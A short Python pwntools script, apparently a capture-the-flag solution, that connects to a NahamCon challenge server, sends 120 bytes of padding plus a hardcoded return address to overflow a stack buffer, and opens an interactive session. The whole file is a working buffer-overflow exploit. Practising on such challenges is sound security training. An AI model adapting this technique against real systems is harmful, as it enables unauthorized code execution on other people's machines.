from pwn import *

r = remote("challenge.nahamcon.com", 31662)

payload = b"a"*120 + p64(0x00000000004011c9)

r.sendline(payload)
r.interactive()

